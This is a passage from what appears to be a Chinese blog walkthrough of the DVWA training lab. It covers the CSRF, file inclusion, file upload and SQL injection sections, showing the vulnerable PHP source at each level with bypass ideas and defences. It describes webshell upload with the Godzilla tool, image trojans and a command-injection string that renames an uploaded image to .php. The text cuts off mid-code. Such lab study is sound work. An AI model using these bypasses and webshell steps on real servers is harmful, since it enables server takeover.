&amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update database with new password</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass_new</span>, PDO::PARAM_STR );<br>        <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );<br>        <span class="hljs-variable">$data</span>-&gt;execute();<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>要求我们先输入就密码再修改，攻击者不知道原始密码的情况下是无法发起攻击的。<br><strong>防护措施</strong><br>加入Anti-CSRF，每次向客户端发送一个随机数，当客户端向服务器发送数据时对比随机数从而确定身份<br>获取当前用户密码，以此判断是否为当前用户操作<br>二次确认（提示、二次密码、验证码）.</p>
<h2 id="DVWA-–-file-inclusion（文件包含）"><a href="#DVWA-–-file-inclusion（文件包含）" class="headerlink" title="DVWA – file inclusion（文件包含）"></a>DVWA – file inclusion（文件包含）</h2><p>文件包含漏洞(File Inclusion)是指当服务器开启了allow_url_include选项时，通过一些php特性函数如include()、require(),include_once(),require_once()函数利用url去动态包含文件，此时如果没有对文件来源进行严格的审查就会导致任意文件读取或者任意命令执行。<br>文件包含分类：</p>
<ul>
<li>本地文件包含：当被包含的文件再本地服务器时叫做本地文件包含，如：../../../ect/password</li>
<li>远程文件包含：当被包含的文件在第三方服务器时，就叫做远程文件包含，如：<a target="_blank" rel="noopener" href="http://www.xx.com/1.php">http://www.xx.com/1.php</a></li>
</ul>
<p>特性函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>()   当使用该函数包含文件时，只有代码执行到<span class="hljs-keyword">include</span>()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行<br><span class="hljs-keyword">include_once</span>()   功能和<span class="hljs-keyword">include</span>()相同，区别在于当重复调用同一文件时，程序只调用一次<br><span class="hljs-keyword">require</span>()   <span class="hljs-keyword">require</span>()与<span class="hljs-keyword">include</span>()的区别在于<span class="hljs-keyword">require</span>()执行如果发生错误，函数会输出错误信息，并终止脚本的运行 。使用<span class="hljs-keyword">require</span>()函数包含文件时，只要程序一执行，立即调用文件，而<span class="hljs-keyword">include</span>()只有程序执行到函数时才调用 <br><span class="hljs-keyword">require</span>()在php程序执行前执行，会先读入 <span class="hljs-keyword">require</span> 所指定引入的文件，使它变成 PHP 程序网页的一部份。<br><span class="hljs-keyword">require_once</span>()   它的功能与<span class="hljs-keyword">require</span>()相同，区别在于当重复调用同一文件时，程序只调用一次<br></code></pre></td></tr></table></figure>

<p>File Inclusion主题：<br>首先需要设置打开文件包含<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-16-49-15.png" alt="打开文件包含" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-16-50-00.png" alt="靶场" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// The page we wish to display 直接获取page参数，未作任何修改</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-16-57-05.png" alt="漏洞复现" class="lazyload"></p>
<p><strong>meidum</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation将参数中的http://和https:// ../ ..\都替换成了空</span><br><span class="hljs-variable">$file</span> = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;http://&quot;</span>, <span class="hljs-string">&quot;https://&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-variable">$file</span> = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;..\&quot;&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里可以看到添加了黑名单将“http://” “https://” “../” “..\”全部替换成了空这个地方可以考虑双写绕过。<br>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-17-07-51.png" alt="绕过尝试" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation 这里限定匹配文件名以file开头或只能为include.php</span><br><span class="hljs-keyword">if</span>( !fnmatch( <span class="hljs-string">&quot;file*&quot;</span>, <span class="hljs-variable">$file</span> ) &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;include.php&quot;</span> ) &#123;<br>    <span class="hljs-comment">// This isn&#x27;t the page we want!</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR: File not found!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>匹配“file*”，以file开头的文件可以访问，或者include.php可以访问，如果不满足以上两种就输出错误语句</p>
<p>漏洞复现：<br>使用伪协议:”file:///访问本地文件系统” <a target="_blank" rel="noopener" href="https://blog.csdn.net/Wu000999/article/details/101925271">参考文章</a><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-17-21-03.png" alt="成功包含" class="lazyload"><br>这里限制了白名单只允许某些文件被包含</p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="hljs-comment">//file变量只能为include.php、file1、file2、file3其中一个</span><br><span class="hljs-keyword">if</span>( <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;include.php&quot;</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;file1.php&quot;</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;file2.php&quot;</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;file3.php&quot;</span> ) &#123;<br>    <span class="hljs-comment">// This isn&#x27;t the page we want!</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR: File not found!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里使用了白名单机制进行防护，简单粗暴，page的参数已经固定了完全杜绝了文件包含</p>
<h2 id="DVWA-–-File-upload-文件上传"><a href="#DVWA-–-File-upload-文件上传" class="headerlink" title="DVWA – File upload(文件上传)"></a>DVWA – File upload(文件上传)</h2><p>这个漏洞由于对上传文件的内、类型没有做严格的过滤、检查，使得攻击者可以通过上传木马文件获取服务器的webshell文件。</p>
<p>需要配置文件上传：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-18-08-12.png" alt="打开这两个选项" class="lazyload"></p>
<p>File upload主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-17-30-50.png" alt="文件上传" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-comment">//文件的目标路径即文件上传路径</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= basename( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Can we move the file to the upload folder?移动用户上传文件到目标路径</span><br>    <span class="hljs-keyword">if</span>( !move_uploaded_file( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ], <span class="hljs-variable">$target_path</span> ) ) &#123;<br>        <span class="hljs-comment">// No</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Yes!</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>从源码可以看到对上传文件类型、内容没有做任何的过滤和检查，同时告诉了我们文件上传路径，存在明显的文件上传漏洞<br>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-19-08-25.png" alt="文件上传复现" class="lazyload"><br>在上传的过程中我们使用了webshell管理工具godzilla来生成一句话和连接获取shell</p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= basename( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br><br>    <span class="hljs-comment">// Is it an image?</span><br>    <span class="hljs-comment">//文件类型必须是image/png或image/jpeg 大小不能超过98Kb</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/jpeg&quot;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/png&quot;</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) ) &#123;<br><br>        <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>        <span class="hljs-keyword">if</span>( !move_uploaded_file( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ], <span class="hljs-variable">$target_path</span> ) ) &#123;<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>可以分析出对文件上传的类型做了限制，要求必须是image/jpeg或者image/png类型，而且对文件上传大小做了限制。<br>漏洞复现：<br>复现中级文件上传漏洞首先需要删除上传的php一句话<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-10-46-57.png" alt="删除刚刚上传的" class="lazyload"><br>还是上传刚才生成的一句话木马<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-10-49-37.png" alt="上传" class="lazyload"><br>提示只能上传的文件类型，这里抓包绕过<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-10-54-27.png" alt="抓包绕过" class="lazyload"><br>然后用哥斯拉连接就好了</p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= basename( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_ext</span>  = substr( <span class="hljs-variable">$uploaded_name</span>, strrpos( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ];<br><br>    <span class="hljs-comment">// Is it an image?strtolower函数把字符转换成小写getimagesize函数会读取文件头信息如果没有则报错，high级别的代码读取文件名最后一个点后的字符串期望通过文件名来限制文件类型</span><br>    <span class="hljs-keyword">if</span>( ( strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpg&quot;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpeg&quot;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;png&quot;</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br>        getimagesize( <span class="hljs-variable">$uploaded_tmp</span> ) ) &#123;<br><br>        <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>        <span class="hljs-keyword">if</span>( !move_uploaded_file( <span class="hljs-variable">$uploaded_tmp</span>, <span class="hljs-variable">$target_path</span> ) ) &#123;<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里可以使用图片马来绕过，图片马的制作类似与pikachu里的制作<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-11-08-27.png" alt="制作图片马" class="lazyload"><br>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-11-19-41.png" alt="复现" class="lazyload"><br>之后需要配合其他漏洞让图片马一脚本的方式解析后再使用webshell管理工具连接即可，如使用命令注入漏洞修改图片的后缀然后再连接。<br>构造语句<code>127.0.0.1 |copy C:\phpstudy_pro\WWW\DVWA\hackable\uploads\2.jpg C:\phpstudy_pro\WWW\DVWA\hackable\uploads\2.php</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-12-52-36.png" alt="配合其他漏洞拿权限" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_ext</span>  = substr( <span class="hljs-variable">$uploaded_name</span>, strrpos( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ];<br><br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;hackable/uploads/&#x27;</span>;<br>    <span class="hljs-comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;上传文件前缀md5加密</span><br>    <span class="hljs-variable">$target_file</span>   =  md5( uniqid() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$uploaded_ext</span>;<br>    <span class="hljs-variable">$temp_file</span>     = ( ( ini_get( <span class="hljs-string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="hljs-string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="hljs-string">&#x27;upload_tmp_dir&#x27;</span> ) ) );<br>    <span class="hljs-variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class="hljs-variable">$uploaded_name</span> ) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$uploaded_ext</span>;<br><br>    <span class="hljs-comment">// Is it an image?</span><br>    <span class="hljs-keyword">if</span>( ( strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpg&#x27;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpeg&#x27;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;png&#x27;</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/png&#x27;</span> ) &amp;&amp;<br>        getimagesize( <span class="hljs-variable">$uploaded_tmp</span> ) ) &#123;<br><br>        <span class="hljs-comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> ) &#123;<br>            <span class="hljs-variable">$img</span> = imagecreatefromjpeg( <span class="hljs-variable">$uploaded_tmp</span> );<br>            imagejpeg( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">100</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$img</span> = imagecreatefrompng( <span class="hljs-variable">$uploaded_tmp</span> );<br>            imagepng( <span class="hljs-variable">$img</span>, <span class="hljs-variable">$temp_file</span>, <span class="hljs-number">9</span>);<br>        &#125;<br>        imagedestroy( <span class="hljs-variable">$img</span> );<br><br>        <span class="hljs-comment">// Can we move the file to the web root from the temp folder?</span><br>        <span class="hljs-keyword">if</span>( rename( <span class="hljs-variable">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class="hljs-variable">$target_path</span> . <span class="hljs-variable">$target_file</span> ) ) ) &#123;<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Delete any temp files</span><br>        <span class="hljs-keyword">if</span>( file_exists( <span class="hljs-variable">$temp_file</span> ) )<br>            unlink( <span class="hljs-variable">$temp_file</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这个级别的文件上传对文件进行了重命名搞了个md5加密，还增加了token值校验，对文件内容做了严格检查。</p>
<h2 id="DVWA-–-SQL-Injection-sql注入"><a href="#DVWA-–-SQL-Injection-sql注入" class="headerlink" title="DVWA –  SQL Injection (sql注入)"></a>DVWA –  SQL Injection (sql注入)</h2><p>sql注入是指攻击者通过注入恶意sql命令，破坏sql查询语句结构从而达到执行恶意sql语句的目的。sql注入漏洞的危害是巨大的，常常导致整个数据库被“脱库”，尽管如此sql注入仍是最常见的web漏洞之一。<br>sql注入的流程：</p>
<ol>
<li>判断是否存在注入，注入是字符型还是数字型(根据后台查询语句进行分类)</li>
<li>猜解sql查询语句中的字段数order by</li>
<li>确定显示字段顺序</li>
<li>获取当前数据库</li>
<li>获取当前数据库中的表</li>
<li>获取表中的字段名</li>
<li>下载数据</li>
</ol>
<p>sql注入主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-16-25-40.png" alt="sql注入" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input 获取id</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check database 拼接sql查询</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span 